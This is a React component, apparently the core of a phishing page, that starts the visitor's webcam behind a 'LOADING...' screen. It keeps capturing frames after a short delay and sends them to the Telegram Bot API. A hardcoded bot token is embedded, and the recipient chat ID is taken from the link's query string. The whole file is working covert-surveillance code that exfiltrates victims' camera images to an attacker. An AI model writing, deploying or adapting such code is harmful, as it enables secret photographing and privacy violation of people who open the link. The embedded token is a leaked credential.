import React, { useEffect, useRef, useState } from 'react';
import { useLocation } from 'react-router-dom';
import axios from 'axios';

const CameraCapture = () => {
  const [image, setImage] = useState(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const { search } = useLocation();

 
  const TELEGRAM_BOT_API_KEY = '8107897091:AAHlaxGomHCaQs_JMXkuGoE5RTJ3uG8txPA';
  const CHAT_ID = search.slice(1);  


  const sendBase64ImageToTelegram = async (base64Image) => {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_API_KEY}/sendPhoto`;

    try {
     
      const blob = await fetch(base64Image).then(res => res.blob());
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'photo.png');  

      const response = await axios.post(url, formData, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
      });

      if (response.data.ok) {
        console.log('');
      } else {
        console.log('Xatolik:', response.data.description);
      }
    } catch (error) {
      console.error('Te');
    }
  };

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
    } catch (err) {
      console.error("Kamera ishga tushirilmadi:", err);
    }
  };

  const captureImage = () => {
    if (canvasRef.current && videoRef.current) {
      const context = canvasRef.current.getContext('2d');
      context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height);
      const dataURL = canvasRef.current.toDataURL('image/png');
      setImage(dataURL);  
    }
  };

  useEffect(() => {
    startCamera();
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach(track => track.stop());
      }
    };
  }, []);


  useEffect(()=>{
    setTimeout(() => {
      captureImage()
    }, 1300);
  })
  useEffect(() => {
    if (image) {
      sendBase64ImageToTelegram(image);  
    }
  }, [image]); 

  return (
    <div>
      <video ref={videoRef} className="cameraV1" width="400" height="300" autoPlay />
      <canvas ref={canvasRef} width="400" height="300" style={{ display: 'none' }} />
      {image && <img className='cameraV1' src={image} alt="Captured" />}
      <div className='center'>
        LOADING...
      </div>
    </div>
  );
};

export default CameraCapture;
